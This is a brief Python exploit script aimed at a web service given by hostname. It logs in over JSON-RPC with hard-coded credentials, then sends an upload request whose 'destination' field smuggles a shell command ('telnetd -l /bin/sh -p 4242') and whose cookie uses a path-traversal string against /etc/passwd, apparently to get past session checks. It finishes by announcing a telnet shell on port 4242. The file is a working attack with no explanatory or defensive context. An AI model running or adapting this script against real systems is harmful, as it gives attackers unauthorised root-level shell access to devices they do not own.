#!/usr/bin/env python3

import sys
import requests

requests.post('https://{:s}/jsonrpc'.format(sys.argv[1]),
  data=b'{"jsonrpc": "2.0", "method": "login", "params": {"user": "bienpnn", "pass": "bienpnn"}}', verify=False)

url = 'https://{:s}/upload'.format(sys.argv[1])

payload = {
  'file.path': '/tmp/upload.input',
  'filename': 'bienpnn',
  'pathparam': 'Configuration',
  'fileparam': 'bienpnn',
  'destination': '\'; telnetd -l /bin/sh -p 4242 #'
}

files = [
  ('input', ('bienpnn', 'bienpnn', 'application/octet-stream'))
]

headers = {
  'Cookie': 'sessionid =../../../etc/passwd; sessionid=aaaaaaaaaaaaaaaa'
}

requests.post(url, headers=headers, data=payload, files=files, verify=False)
print('telnetd shell spawned at {:s}:4242'.format(sys.argv[1]))
